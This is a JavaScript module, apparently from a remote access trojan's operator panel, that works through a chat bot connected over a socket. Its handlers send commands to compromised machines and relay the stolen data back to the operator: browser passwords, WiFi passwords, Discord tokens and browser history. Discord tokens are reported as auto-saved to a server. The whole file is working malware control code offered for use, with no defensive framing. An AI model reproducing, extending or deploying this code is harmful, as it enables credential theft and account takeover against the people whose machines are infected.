import { ResponseFormatter } from '../utils/formatter.js';

/**
 * Credential Harvesting Commands Module
 */

export class CredentialCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  /**
   * Browser passwords command
   */
  async passwords(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('🔐 Extracting browser passwords...\n\n_This may take 30 seconds..._') 
    });

    const result = await this.ratClient.sendCommand(sessionId, 'passwords', 60000);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.credentials(result.data, 'BROWSER') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * WiFi passwords command
   */
  async wifi(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.sendCommand(sessionId, 'wifi');
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.credentials(result.data, 'WIFI') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Discord tokens command
   */
  async discord(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.sendCommand(sessionId, 'discord');
    
    if (result.success) {
      try {
        const tokens = JSON.parse(result.data);
        let response = ResponseFormatter.header('🎮', 'DISCORD TOKENS') + '\n\n';
        
        if (Array.isArray(tokens) && tokens.length > 0) {
          tokens.forEach((token, idx) => {
            response += `${idx + 1}. \`${token}\`\n`;
          });
        } else {
          response += 'No Discord tokens found';
        }
        
        response += '\n💾 _Auto-saved to server_';
        await this.sock.sendMessage(chatId, { text: response });
      } catch {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.info(result.data) 
        });
      }
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Browser history command
   */
  async history(chatId, sessionId, browser) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (!browser) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /history <chrome|edge>') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`📜 Extracting ${browser} history...\n\n_Please wait..._`) 
    });

    const result = await this.ratClient.sendCommand(sessionId, `history ${browser}`);
    
    if (result.success) {
      try {
        const history = JSON.parse(result.data);
        let response = ResponseFormatter.header('📜', `${browser.toUpperCase()} HISTORY`) + '\n\n';
        
        if (Array.isArray(history) && history.length > 0) {
          history.slice(0, 15).forEach((item, idx) => {
            response += `\n*[${idx + 1}]* ${item.title || '[No title]'}\n`;
            response += `🔗 ${item.url}\n`;
          });
          response += `\n_Showing 15 of ${history.length} entries_`;
        } else {
          response += 'No history found';
        }
        
        await this.sock.sendMessage(chatId, { text: response });
      } catch {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.info(result.data) 
        });
      }
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }
}